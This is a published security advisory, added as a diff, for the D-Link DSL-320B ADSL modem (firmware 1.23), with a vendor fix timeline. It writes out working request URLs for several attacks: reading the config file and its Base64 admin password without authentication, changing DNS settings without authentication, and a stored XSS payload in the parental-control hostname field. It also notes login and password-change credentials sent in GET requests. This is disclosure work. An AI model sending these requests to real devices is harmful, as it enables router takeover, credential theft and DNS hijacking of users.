@@ -1,0 +1,66 @@
+Device: DSL-320B
+
+Firmware Version: EU_DSL-320B v1.23 date: 28.12.2010
+
+Vendor URL: http://www.dlink.com/de/de/home-solutions/connect/modems-and-gateways/dsl-320b-adsl-2-ethernet-modem
+
+============ Vulnerability Overview: ============  
+
+* Access to the Config file without authentication => full authentication bypass possible! :): (1)
+
+192.168.178.111/config.bin
+
+===<snip>====
+<sysUserName value="admin"/>
+<zipb enable="1"/>
+<dns dynamic="disable" primary="1.1.1.1" secondary="2.2.2.3" domain="Home" host="alpha"/>
+<sysPassword value="dGVzdA=="/>
+===<snip>====
+
+=> sysPassword is Base64 encoded
+
+* Access to the logfile without authentication: (1)
+192.168.178.111/status/status_log.sys
+
+* Change the DNS Settings without authentication: (1)
+http://192.168.178.111/advanced/adv_dns.xgi?&SET/dns/mode=0&SET/dns/mode/server/primarydns=1.1.1.1&SET/dns/mode/server/secondarydns=2.2.2.2
+
+* Stored XSS within parental control (2):
+	
+	=> Parameter: set/bwlist/entry:1/hostname
+	
+Request:
+http://192.168.178.111/home/home_parent.xgi?&set/bwlist/enable=1&set/bwlist/bw_status=0&set/bwlist/entry:1/bw_flag=0&set/bwlist/entry:1/hostname=%22%3E%3Cimg%20src=%220%22%20onerror=alert(1)%3E&set/bwlist/entry:1/weekday=6&set/bwlist/entry:1/begintime=00:00&set/bwlist/entry:1/endtime=23:59&set/bwlist/entry:1/store=1&set/bwlist/apply=1
+
+Again you are able to place this XSS without authentication. :)
+
+* Login Credentials in HTTP GET are not a good idea => use HTTP Post! (3)
+http://192.168.178.111/login.xgi?user=admin&pass=admin1
+
+* Credentials in HTTP GET via password change request are not a good idea => use HTTP Post!: (3)
+http://192.168.178.111/tools/tools_admin.xgi?&set/sys/account/user/oldpwd=admin&set/sys/account/user/password=test&CMT=1
+
+============ Solution ============
+
+Update to firmware version 1.25:
+
+(1) - fixed
+(2) - not fixed but authentication needed
+(3) - not fixed
+
+============ Credits ============
+
+The vulnerability was discovered by Michael Messner
+Mail: devnull#at#s3cur1ty#dot#de
+Web: http://www.s3cur1ty.de/advisories
+Twitter: @s3cur1ty_de
+
+============ Time Line: ============
+
+17.03.2012 - discovered vulnerabilities
+17.03.2013 - informed vendor about the vulnerabilities
+25.04.2013 - tested beta version from vendor
+30.04.2013 - vendor releases patch
+06.05.2013 - public disclosure
+
+===================== Advisory end =====================
